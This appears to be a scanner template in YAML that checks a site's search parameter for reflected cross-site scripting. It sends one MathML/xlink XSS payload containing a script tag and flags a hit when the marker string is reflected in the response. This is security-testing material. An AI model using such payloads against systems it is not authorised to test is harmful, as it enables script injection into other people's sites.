id: xss2-123
name: 'Reflected XSS2 ctx-2 via search'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in search'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      search:
        - '<math><mi//xlink:href="data:x,<script>alert(nx2122)</script>">'
    matchers:
      - type: word
        part: body
        words:
          - 'nx2122'
